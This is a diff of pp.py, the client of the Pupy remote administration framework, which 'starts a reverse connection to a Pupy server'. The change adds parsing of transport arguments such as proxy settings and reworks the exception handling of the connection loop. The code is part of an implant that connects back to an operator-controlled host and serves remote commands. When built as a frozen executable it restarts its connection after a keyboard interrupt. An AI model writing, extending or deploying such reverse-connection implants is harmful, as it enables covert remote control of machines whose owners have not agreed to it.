@@ -29,7 +29,6 @@ import os
 import subprocess
 import threading
 import multiprocessing
-import logging
 import StringIO
 import json
 import urllib2
@@ -42,6 +41,7 @@ import imp
 import argparse
 from network.conf import transports
 import logging
+import shlex
 #logging.getLogger().setLevel(logging.DEBUG)
 
 
@@ -115,9 +115,11 @@ def main():
 		parser = argparse.ArgumentParser(prog='pp.py', formatter_class=argparse.RawTextHelpFormatter, description="Starts a reverse connection to a Pupy server\nLast sources: https://github.com/n1nj4sec/pupy\nAuthor: @n1nj4sec (contact@n1nj4.eu)\n")
 		parser.add_argument('--transport', choices=[x for x in transports.iterkeys()], default=TRANSPORT, help="the transport to use ! (the server needs to be configured with the same transport) ")
 		parser.add_argument('host', metavar='host:port', help='The address of the pupy server to connect to')
+		parser.add_argument('transport_args', nargs=argparse.REMAINDER, help="change some transport arguments ex for proxy transports: proxy_addr=192.168.0.1 proxy_port=8080 proxy_type=HTTP")
 		args=parser.parse_args()
 		HOST=args.host
 		TRANSPORT=args.transport
+		TRANSPORT_ARGS=args.transport_args
 	if "windows" in platform.system().lower():
 		try:
 			import pupy
@@ -142,9 +144,25 @@ def main():
 				rport=443
 			print "connecting to %s:%s using transport %s ..."%(rhost, rport, TRANSPORT)
 			t=transports[TRANSPORT]
-			client=t['client'](**t['client_kwargs'])
+			client_args=t['client_kwargs']
+			transport_args=t['client_transport_kwargs']
+			for val in shlex.split(' '.join(TRANSPORT_ARGS)):
+				tab=val.split("=",1)
+				if len(tab)!=2:
+					exit("Error: transport arguments must be in format NAME=VALUE or 'NAME=value with spaces'")
+				if tab[0].lower() in client_args:
+					client_args[tab[0].lower()]=tab[1]
+				elif tab[0].lower() in transport_args:
+					transport_args[tab[0].lower()]=tab[1]
+				else:
+					exit("unknown transport argument : %s"%tab[0])
+
+			print "using client options: %s"%client_args
+			print "using transports options: %s"%transport_args
+
+			client=t['client'](**client_args)
 			s=client.connect(rhost, rport)
-			stream = t['stream'](s, t['client_transport'], t['client_transport_kwargs'])
+			stream = t['stream'](s, t['client_transport'], transport_args)
 			def check_timeout(event, cb, timeout=10):
 				start_time=time.time()
 				while True:
@@ -167,13 +185,17 @@ def main():
 			while True:
 				attempt=0
 				conn.serve()
-		except KeyboardInterrupt:
-			print "keyboard interrupt raised, restarting the connection"
-		except SystemExit:
-			print "SystemExit raised"
-			break
 		except EOFError:
 			print "EOF received. exiting."
+			break
+		except KeyboardInterrupt:
+			if not getattr(sys, 'frozen', False):
+				print ""
+				break
+			else:
+				print "keyboard interrupt raised, restarting the connection"
+		except SystemExit as e:
+			print e
 			break
 		except Exception as e:
 			print e
